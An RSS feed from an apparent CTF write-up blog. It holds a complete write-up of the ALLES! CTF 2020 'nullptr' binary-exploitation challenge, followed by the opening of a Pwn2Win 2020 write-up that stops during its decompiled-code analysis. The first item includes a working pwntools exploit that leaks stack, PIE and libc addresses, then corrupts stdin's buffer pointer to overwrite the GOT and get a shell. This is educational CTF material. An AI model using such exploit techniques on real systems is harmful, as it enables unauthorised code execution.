<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>pwn-diaries</title>
    <link>/</link>
      <atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <description>pwn-diaries</description>
    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><lastBuildDate>Mon, 07 Sep 2020 16:12:46 +0100</lastBuildDate>
    <image>
      <url>/images/icon_hu4c376b9e19822f88891eebc803645be6_6371_512x512_fill_lanczos_center_2.png</url>
      <title>pwn-diaries</title>
      <link>/</link>
    </image>
    
    <item>
      <title>ALLES! CTF 2020   Nullptr</title>
      <link>/post/alles-ctf-2020-nullptr/</link>
      <pubDate>Mon, 07 Sep 2020 16:12:46 +0100</pubDate>
      <guid>/post/alles-ctf-2020-nullptr/</guid>
      <description>&lt;h4 id=&#34;challenge-details&#34;&gt;Challenge Details&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Event&lt;/th&gt;
&lt;th&gt;Challenge&lt;/th&gt;
&lt;th&gt;Category&lt;/th&gt;
&lt;th&gt;Link&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ALLES! CTF 2020&lt;/td&gt;
&lt;td&gt;nullptr&lt;/td&gt;
&lt;td&gt;PWN&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://ctftime.org/event/1091&#34;&gt;https://ctftime.org/event/1091&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Category:&lt;strong&gt;Binary Exploitation
&lt;/strong&gt;Difficulty:&lt;strong&gt;Medium/Hard
&lt;/strong&gt;Author:&lt;strong&gt;Flo
&lt;/strong&gt;First Blood:3k&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Solved By:&lt;/strong&gt; 3k, RPISEC, DiceGang, RedRocket (4 solves)&lt;/p&gt;
&lt;p&gt;Welcome to the House Of &lt;em&gt;I&amp;rsquo;m pretty sure this is not even a heap challenge&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Challenge Files:&lt;/strong&gt;
&lt;a href=&#34;https://static.allesctf.net//d74dcd7033502679623abc5c15666791f4faeae11245dafa02d4c5617e3a6dcd/nullptr.zip&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;nullptr.zip&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;ncat --ssl 7b000000455b22693d06c5a7.challenges.broker5.allesctf.net 1337
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;We participated in ALLES! CTF 2020 with 
&lt;a href=&#34;https://ctftime.org/team/110885&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;the3000&lt;/a&gt; team, and we ranked 8th at the end \o/ !&lt;/p&gt;
&lt;h3 id=&#34;tldl&#34;&gt;TL;DL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Leak stack pointer using logic bug in scanf format string.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Leak &lt;strong&gt;Libc&lt;/strong&gt; and &lt;strong&gt;PIE&lt;/strong&gt; addresses through arbitrary read using already given functionality.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use arbitrary null pointer to overwrite **_IO_buf_base ** of stdin structure.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get a shell \o/.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As Detailed in the description of the challenge, the author provided the necessary files to run the binary as intended which include the binary, Dockerfile and source code file.&lt;/p&gt;
&lt;h2 id=&#34;reverse-engineering&#34;&gt;Reverse Engineering&lt;/h2&gt;
&lt;h4 id=&#34;static-analysis&#34;&gt;Static Analysis&lt;/h4&gt;
&lt;p&gt;We were give the source code of the application which makes it easier for us to analyze it and a 64 bits  executable not stripped and dynamically linked as shown below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ file nullptr
nullptr: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dc37e094d9cc17b7b9c50eeba3a7100d412954d3, for GNU/Linux 3.2.0, with debug_info, not stripped

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Also we have an idea about the **Libc ** (libc 2.30) used since we have the Dockerfile which includes the ubuntu version used on the remote server.&lt;/p&gt;
&lt;p&gt;The given binary has nearly full protection except &lt;strong&gt;Partial Relro&lt;/strong&gt; as shown below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ checksec ./nullptr
[*] &#39;/tmp/kek/nullptr&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;source-code-analysis&#34;&gt;Source Code analysis&lt;/h4&gt;
&lt;p&gt;Let&amp;rsquo;s start with the &lt;code&gt;main&lt;/code&gt; function:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int main(void) {
    unsigned long addr;
    int menuchoice;
    while (1) {
        printf(&amp;quot;[1. view, 2. null, -1. exit]&amp;gt; \n&amp;quot;); fflush(stdout);
        scanf(&amp;quot;%d&amp;quot;, &amp;amp;menuchoice); getc(stdin);
        switch (menuchoice) {
        case 1:
            printf(&amp;quot;view address&amp;gt; \n&amp;quot;); fflush(stdout);
            scanf(&amp;quot;%lu&amp;quot;, &amp;amp;addr); getc(stdin);
            printf(&amp;quot;%p: %p\n&amp;quot;, addr, *(void**)addr);
            break;
        case 2:
            printf(&amp;quot;nuke address&amp;gt; \n&amp;quot;); fflush(stdout);
            scanf(&amp;quot;%lu&amp;quot;, &amp;amp;addr); getc(stdin);
            *(void**)addr = NULL;
            printf(&amp;quot;ok!\n&amp;quot;);
            break;
        case -1:
            printf(&amp;quot;bye!\n&amp;quot;);
            return 1;
        default:;
        }
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the main subroutine introduces 3 choices as following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;View address&lt;/code&gt;: Reads a long unsigned number  using &amp;lsquo;%lu&amp;rsquo; format string of &lt;code&gt;scanf&lt;/code&gt; and print out the address of &lt;code&gt;addr&lt;/code&gt; variable alongside the content of the pointer supplied by the user which means the content of the pointer contained in &lt;code&gt;addr&lt;/code&gt; variable.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Nuke address&lt;/code&gt; : Reads a long unsigned number  using &amp;lsquo;%lu&amp;rsquo; format string of &lt;code&gt;scanf&lt;/code&gt; and overwrite the content of given address with null bytes (QWORD).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;exit&lt;/code&gt;: Print out a message then returns.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Besides the &lt;code&gt;main&lt;/code&gt; function, the author was too generous to provide us with a win function which executes a &amp;lsquo;/bin/sh&amp;rsquo;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void get_me_out_of_this_mess() { execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, NULL); }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;h4 id=&#34;leaking-stack-address&#34;&gt;Leaking Stack address&lt;/h4&gt;
&lt;p&gt;the binary has a logic bug, which can be abused by giving &lt;code&gt;scanf&lt;/code&gt; a non-numeric input.&lt;/p&gt;
&lt;p&gt;if the conversion of the input to unsigned long fails, scanf will just free the used pointer and returns without modifying its second argument.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if (flags &amp;amp; NUMBER_SIGNED)
    //Signed Number
      num.l = __strtol_internal(char_buffer_start (&amp;amp;charbuf), &amp;amp;tw, base, flags &amp;amp; GROUP);
else
     //Unsigned Number  (our case)
      num.ul = __strtoul_internal(char_buffer_start (&amp;amp;charbuf), &amp;amp;tw, base, flags &amp;amp; GROUP);
            }
//check if the input was converted successfully else it calls conv_error()
if (__glibc_unlikely (char_buffer_start (&amp;amp;charbuf) == tw))
            conv_error (); //free the pointers and returns.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Trying this theory on the given binary reveals a stack leak.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ./nullptr 
[1. view, 2. null, -1. exit]&amp;gt; 
1
view address&amp;gt; 
a
0x7fffe7280ad0: 0x1 #Stack Leak \o/
[1. view, 2. null, -1. exit]&amp;gt; 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It&amp;rsquo;s time to start implementing the exploit.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;  from pwn import *
  p = remote(&amp;quot;172.17.0.2&amp;quot;,1024)
  p.recvline()
  p.sendline(&amp;quot;1&amp;quot;)
  p.recvline()
  p.sendline(&amp;quot;a&amp;quot;)
  data = p.recvline().strip().split(&amp;quot;:&amp;quot;)[0]
  stack_leak = int(data,16)
  print hex(stack_leak)

&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;leaking-libc--pie-addresses&#34;&gt;Leaking Libc &amp;amp; PIE addresses&lt;/h4&gt;
&lt;p&gt;Since we have a valid stack address and an arbitrary read, we can find an address on the stack that contains a &lt;strong&gt;PIE&lt;/strong&gt; address and use &lt;code&gt;View address&lt;/code&gt; to get its content. from that we can look for a &lt;strong&gt;Libc&lt;/strong&gt; address in the binary.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

p = process(&amp;quot;ncat --ssl 7b000000455b22693d06c5a7.challenges.broker5.allesctf.net 1337&amp;quot;,shell=True)
p.recvline()

p.sendline(&amp;quot;1&amp;quot;)
p.recvline()
p.sendline(&amp;quot;a&amp;quot;)
data = p.recvline().strip().split(&amp;quot;:&amp;quot;)[0]
stack_leak = int(data,16)
print hex(stack_leak)
p.recvline()
off1 = stack_leak + (0x108-(9*8)) #offset on the stack that contains PIE address.
p.sendline(&amp;quot;1&amp;quot;)
p.sendline(str(off1))
p.recvline()

pie_leak = int(p.recvline().strip().split(&amp;quot;: &amp;quot;)[1],16)
p.recvline()
print hex(pie_leak)

off2 = pie_leak + 0x2f78 #offset in the binary that contains libc address.
bin_base = pie_leak - 0x10a0
win = bin_base + 0x1199
got = bin_base + 0x4000
print hex(bin_base)
p.sendline(&amp;quot;1&amp;quot;)
p.sendline(str(off2))
p.recvline()
libc_leak = int(p.recvline().strip().split(&amp;quot;: &amp;quot;)[1],16)
libc_base = libc_leak - 0x87490
print hex(libc_base)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;getting-shell&#34;&gt;Getting shell&lt;/h4&gt;
&lt;p&gt;Since the binary is partial relro, our idea is to overwrite one of the GOT entries with the address of win function. But how can we do that with just a null byte overwrite?
Let&amp;rsquo;s examine the following &lt;code&gt;stdin&lt;/code&gt; structure :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;gdb-peda$ p stdin
$1 = (FILE *) 0x7ffff7f95980 &amp;lt;_IO_2_1_stdin_&amp;gt;
gdb-peda$ p _IO_2_1_stdin_
$2 = {
  file = {
    _flags = 0xfbad2288,
    _IO_read_ptr = 0x5555555596b0 &amp;quot;&amp;quot;,
    _IO_read_end = 0x5555555596b0 &amp;quot;&amp;quot;,
    _IO_read_base = 0x5555555596b0 &amp;quot;&amp;quot;,
    _IO_write_base = 0x5555555596b0 &amp;quot;&amp;quot;,
    _IO_write_ptr = 0x5555555596b0 &amp;quot;&amp;quot;,
    _IO_write_end = 0x5555555596b0 &amp;quot;&amp;quot;,
    _IO_buf_base = 0x5555555596b0 &amp;quot;&amp;quot;,
    _IO_buf_end = 0x555555559ab0 &amp;quot;&amp;quot;,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = &amp;quot;&amp;quot;,
    _lock = 0x7ffff7f984d0 &amp;lt;_IO_stdfile_0_lock&amp;gt;,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7f95a60 &amp;lt;_IO_wide_data_0&amp;gt;,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0xffffffff,
    _unused2 = &#39;\000&#39; &amp;lt;repeats 19 times&amp;gt;
  },
  vtable = 0x7ffff7f974a0 &amp;lt;_IO_file_jumps&amp;gt;
}
gdb-peda$ 

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;when a &lt;code&gt;scanf &lt;/code&gt; is used, it stores the input in the &lt;strong&gt;_IO_read_base&lt;/strong&gt; which is a heap chunk pointer and then gets updated with   &lt;strong&gt;_IO_buf_base&lt;/strong&gt; pointer.&lt;/p&gt;
&lt;p&gt;So our idea is to partially null-overwrite the &lt;strong&gt;_IO_buf_base&lt;/strong&gt; in order to point to &lt;code&gt;GOT.plt&lt;/code&gt; section  so the next &lt;code&gt;scanf &lt;/code&gt; call will store our input in that location.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s take a look at the memory mapping of our process:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;gdb-peda$ vmmap 
Start              End                Perm	Name
0x0000564c3b44e000 0x0000564c3b44f000 r--p	/tmp/kek/nullptr
0x0000564c3b44f000 0x0000564c3b450000 r-xp	/tmp/kek/nullptr
0x0000564c3b450000 0x0000564c3b451000 r--p	/tmp/kek/nullptr
0x0000564c3b451000 0x0000564c3b452000 r--p	/tmp/kek/nullptr
0x0000564c3b452000 0x0000564c3b453000 rw-p	/tmp/kek/nullptr //GOT.plt 
0x0000564c3befc000 0x0000564c3bf1d000 rw-p	[heap]
0x00007efdc0dd0000 0x00007efdc0df5000 r--p	/lib/x86_64-linux-gnu/libc-2.30.so
0x00007efdc0df5000 0x00007efdc0f3f000 r-xp	/lib/x86_64-linux-gnu/libc-2.30.so
0x00007efdc0f3f000 0x00007efdc0f89000 r--p	/lib/x86_64-linux-gnu/libc-2.30.so
0x00007efdc0f89000 0x00007efdc0f8c000 r--p	/lib/x86_64-linux-gnu/libc-2.30.so
0x00007efdc0f8c000 0x00007efdc0f8f000 rw-p	/lib/x86_64-linux-gnu/libc-2.30.so
0x00007efdc0f8f000 0x00007efdc0f95000 rw-p	mapped
0x00007efdc0fc5000 0x00007efdc0fc6000 r--p	/lib/x86_64-linux-gnu/ld-2.30.so
0x00007efdc0fc6000 0x00007efdc0fe4000 r-xp	/lib/x86_64-linux-gnu/ld-2.30.so
0x00007efdc0fe4000 0x00007efdc0fec000 r--p	/lib/x86_64-linux-gnu/ld-2.30.so
0x00007efdc0fed000 0x00007efdc0fee000 r--p	/lib/x86_64-linux-gnu/ld-2.30.so
0x00007efdc0fee000 0x00007efdc0fef000 rw-p	/lib/x86_64-linux-gnu/ld-2.30.so
0x00007efdc0fef000 0x00007efdc0ff0000 rw-p	mapped
0x00007ffc42b91000 0x00007ffc42bb2000 rw-p	[stack]
0x00007ffc42bef000 0x00007ffc42bf3000 r--p	[vvar]
0x00007ffc42bf3000 0x00007ffc42bf5000 r-xp	[vdso]

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We noticed that the &lt;code&gt;GOT&lt;/code&gt; &amp;amp; &lt;code&gt;Heap&lt;/code&gt; pointers have only 3 different bytes, what if due to &lt;strong&gt;ASLR&lt;/strong&gt; the last 3 bytes of GOT&amp;rsquo;s address are NULL, it will become &lt;code&gt;0x0000564c3b000000&lt;/code&gt;.
In this case, we can partially overwrite the  &lt;strong&gt;_IO_buf_base&lt;/strong&gt;&amp;rsquo;s last 3 bytes with &lt;code&gt;\x00&lt;/code&gt; it will point to  binary&amp;rsquo;s GOT section. Therefore,  the next &lt;code&gt;scanf&lt;/code&gt; will read our input and store it into the GOT.&lt;/p&gt;
&lt;p&gt;Since our target is the base of the GOT section, the last 12 bits will always be zeros. So we have 12  bits affected by the ASLR to bruteforce. Our chance to pull this off is 2^12.&lt;/p&gt;
&lt;p&gt;Final Exploit:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

while True:
    p = remote(&amp;quot;172.17.0.2&amp;quot;,1024)
    p.recvline()

    p.sendline(&amp;quot;1&amp;quot;)
    p.recvline()
    p.sendline(&amp;quot;a&amp;quot;)
    data = p.recvline().strip().split(&amp;quot;:&amp;quot;)[0]
    stack_leak = int(data,16)
    print hex(stack_leak)
    p.recvline()
    off1 = stack_leak + (0x108-(9*8))
    p.sendline(&amp;quot;1&amp;quot;)
    p.sendline(str(off1))
    p.recvline()
    pie_leak = int(p.recvline().strip().split(&amp;quot;: &amp;quot;)[1],16)
    p.recvline()
    print hex(pie_leak)
    off2 = pie_leak + 0x2f78
    bin_base = pie_leak - 0x10a0
    win = bin_base + 0x1199
    got = bin_base + 0x4000
    print hex(bin_base)
    if got &amp;amp; 0xfff000 == 0:
        p.sendline(&amp;quot;1&amp;quot;)
        p.sendline(str(off2))
        p.recvline()
        libc_leak = int(p.recvline().strip().split(&amp;quot;: &amp;quot;)[1],16)
        libc_base = libc_leak - 0x87490
        dl_runtime = libc_base + 0x20da30
        print hex(libc_base)
        buf_base = libc_base + 0x1ea9b3
        p.recv(8000)
        p.sendline(&amp;quot;1&amp;quot;)
        p.recvline()
        p.sendline(str(got))
        addr1 = int(p.recvline().strip().split(&amp;quot;: &amp;quot;)[1],16)
        p.recvline()
        p.sendline(&amp;quot;1&amp;quot;)
        p.recvline()
        p.sendline(str(got+8))
        addr2 = int(p.recvline().strip().split(&amp;quot;: &amp;quot;)[1],16)
        p.recvline()
        p.sendline(&amp;quot;2&amp;quot;)
        p.sendline(str(buf_base))
        payload = &amp;quot;&amp;quot;
        payload += p64(addr1) 
        payload += p64(addr2)
        payload += p64(dl_runtime)
        payload += p64(win)
        print &amp;quot;Getting shell \o/&amp;quot;
        p.sendline(payload)
        p.interactive()
        p.close()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Our target is puts&amp;rsquo; GOT entry which is the fourth entry in the section, &lt;code&gt;addr1&lt;/code&gt;,&lt;code&gt;addr2 &lt;/code&gt; and &lt;code&gt;dl_runtime&lt;/code&gt; are the first,  second and third entries, mandatory for the binary to continue execution smoothly.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$  python sploit.py
[..]
[+] Opening connection to 172.17.0.2 on port 1024: Done
0x7ffcdd46ca50
0x560459ffd0a0
0x560459ffc000
0x7f396bf9b000
Getting shell \o/
[*] Switching to interactive mode
nuke address&amp;gt; 
ok!
[1. view, 2. null, -1. exit]&amp;gt; 
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag
CSCG¬TEST_FLAG}
$  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;\o/ !&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Pwn2Win 2020   At_Your_Command</title>
      <link>/post/pwn2win-2020-at_your_command/</link>
      <pubDate>Sun, 31 May 2020 16:20:07 +0100</pubDate>
      <guid>/post/pwn2win-2020-at_your_command/</guid>
      <description>&lt;h4 id=&#34;challenge-details&#34;&gt;Challenge Details&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Event&lt;/th&gt;
&lt;th&gt;Challenge&lt;/th&gt;
&lt;th&gt;Category&lt;/th&gt;
&lt;th&gt;Link&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Pwn2Win&lt;/td&gt;
&lt;td&gt;At_Your_Command&lt;/td&gt;
&lt;td&gt;PWN&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://ctftime.org/event/961&#34;&gt;https://ctftime.org/event/961&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Through reverse engineering work on Pixel 6, we identified the ButcherCorp server responsible for programming the  RBSes. Our exploration team was only able to have limited access to this machine and extract the binaries from the programming service. As it  runs with high privilege, exploiting it will allow us to extract more  data from that server. Those data will bring us closer to the discovery  of the person responsible for the Rebellion. Can you help us with this  task?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Server:&lt;/strong&gt; nc command.pwn2.win 1337&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://static.pwn2win.party/at_your_command_f08a76a2aedf590841e99886aad3f93b86030877098f3bc945fdea8f44a7b392.tar.gz&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
&lt;a href=&#34;https://storage.cloud.google.com/pwn2win-files/at_your_command_f08a76a2aedf590841e99886aad3f93b86030877098f3bc945fdea8f44a7b392.tar.gz&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Mirror&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ID: at_your_command&lt;/p&gt;
&lt;p&gt;Score: 267&lt;/p&gt;
&lt;p&gt;Solves: 26&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc command.pwn2.win 1337
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;tldl&#34;&gt;TL;DL&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Leak Libc address through unsorted bin chunks by partial overwrite.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Construct a fake file structure in a controlled area (concatenation of 2 chunks).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Overwrite File pointer using format string bug.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Get shell through calling fclose() \o/ !&lt;/p&gt;
&lt;p&gt;Pwn2Win was a rough CTF competition, we were able only to solve one PWN challenge which took us nearly 6 hours to be the 4th team who solved it with our teammate 
&lt;a href=&#34;https://twitter.com/ThamerBaccouch&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Aracna&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;reverse-engineering&#34;&gt;Reverse Engineering&lt;/h2&gt;
&lt;p&gt;First of all, starting with static analysis the given binary has nearly full protection as show below:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ checksec ./command
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As always, let&amp;rsquo;s start with just running the binary blindly and check the implemented functionalities through playing with different inputs.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ./command 
Welcome to the command system
=============================
Your name: test_name
Welcome test_name

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&amp;gt; 1
Priority: aa
Command: bbb
The command has been included at index 0

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&amp;gt; 2
Command index: 0

Priority: 0
Command: bbb

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&amp;gt; 4

Index 0
Priority: 0
Command: bbb

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&amp;gt; 3
Command index: 0
The command has been successfully deleted

Choose an option:
1. Include command
2. Review command
3. Delete command
4. List commands
5. Send commands
&amp;gt; 5

Sending commands...
Are you sending the commands to which rbs?
aa
You command Mr. test_name!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the binary after reading a name it looks like it has the following commands:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Include command&lt;/code&gt; : It takes 2 inputs a priority and a text command and stores them somewhere.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Review command&lt;/code&gt;: Display the provided details of an included command via an index.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Delete command&lt;/code&gt;: Delete an included command via an index.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;List commands&lt;/code&gt;: List all the included commands&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Send commands&lt;/code&gt;: It asks for an input then exit after printing the provided name in the first step.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&amp;rsquo;s fire up IDA and start analyzing the functions.&lt;/p&gt;
&lt;h5 id=&#34;main-function&#34;&gt;main function&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  time_t v3; // rax
  FILE *stream; // [rsp+0h] [rbp-70h]
  ssize_t v6; // [rsp+8h] [rbp-68h]
  char s; // [rsp+10h] [rbp-60h]
  unsigned __int64 v8; // [rsp+68h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init_chall(); 
  welcome_message();
  printf(&amp;quot;Your name: &amp;quot;, a2);
  v6 = read(0, buf, 0xCuLL);
  if ( v6 &amp;amp;&amp;amp; buf[v6 - 1] == 10 )
    buf[v6 - 1] = 0;
  printf(&amp;quot;Welcome %s\n&amp;quot;, buf);
  memset(&amp;amp;s, 0, 0x50uLL);
  manage_commands((__int64)&amp;amp;s);
  puts(&amp;amp;byte_15FA);
  puts(&amp;quot;Sending commands...&amp;quot;);
  v3 = time(0LL);
  snprintf(filename, 0x2DuLL, &amp;quot;/commands/%ld&amp;quot;, v3);
  stream = fopen(filename, &amp;quot;w&amp;quot;);
  if ( !stream )
  {
    printf(&amp;quot;[ERROR] An error happened while opening the file&amp;quot;);
    exit(2);
  }
  send_command((__int64)&amp;amp;s, &amp;amp;stream);
  fclose(stream);
  return 0LL;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the binary is stripped so we had to rename the functions as shown in the pseudo-code above. The binary just run in the following execution flow.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;init_chall()&lt;/code&gt; : It just disables buffering and sets alarm after 60 seconds.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;welcome_message()&lt;/code&gt; : it displays a hello message.&lt;/li&gt;
&lt;li&gt;It reads a name from &lt;code&gt;stdin&lt;/code&gt; then prints &lt;code&gt;Welcome Your_Name&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;manage_commands()&lt;/code&gt;: it manages the commands as explained before (include, review, &amp;hellip;).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;send_command()&lt;/code&gt;: it logs all the commands provided into a file.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let&amp;rsquo;s dive into &lt;code&gt;manage_commands&lt;/code&gt; function since the main functionalities are implemented in it.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;__int64 __fastcall manage_commands(__int64 a1)
{
  __int64 result; // rax
  while ( 1 )
  {
    menu(); //it prints the menu described before.
    result = (unsigned int)read_long_int(); // it reads 8 bytes long
    switch ( result )
    {
      case 1LL:
        include_command(a1);
        break;
      case 2LL:
        review_command(a1);
        break;
      case 3LL:
        delete_command(a1);
        break;
      case 4LL:
        list_commands(a1);
        break;
      case 5LL:
        return result;
      default:
        error();
        return result;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After renaming the functions, this subroutine is handling the following functions depending on user input:&lt;/p&gt;
&lt;h5 id=&#34;include_command-function&#34;&gt;Include_command function&lt;/h5&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int __fastcall include_command(__int64 a1)
{
  int i; // [rsp+14h] [rbp-1Ch]
  ssize_t v3; // [rsp+18h] [rbp-18h]

  for ( i = 0; ; ++i )
  {
    if ( i &amp;gt; 9 )
      return puts(&amp;quot;[INFO] The authorized limit has been reached!&amp;quot;);
    if ( !*(_QWORD *)(8LL * i + a1) )
      break;
  }
  *(_QWORD *)(8LL * i + a1) = malloc(0x188uLL); 
  printf(&amp;quot;Priority: &amp;quot;);
  **(_QWORD **)(8LL * i + a1) = (int)read_long_int();
  printf(&amp;quot;Command: &amp;quot;);
  v3 = read(0, (void *)(*(_QWORD *)(8LL * i + a1) + 8LL), 0x170uLL);
  if ( v3 )
  {
    if ( *(_BYTE *)(*(_QWORD *)(8LL * i + a1) + v3 - 1 + 8) == 10 )
      *(_BYTE *)(*(_QWORD *)(8LL * i + a1) + v3 - 1 + 8) = 0;
  }
  return printf(&amp;quot;The command has been included at index %d\n&amp;quot;, (unsigned int)i);
}
&lt;/code&gt;&lt;/pre&gt;
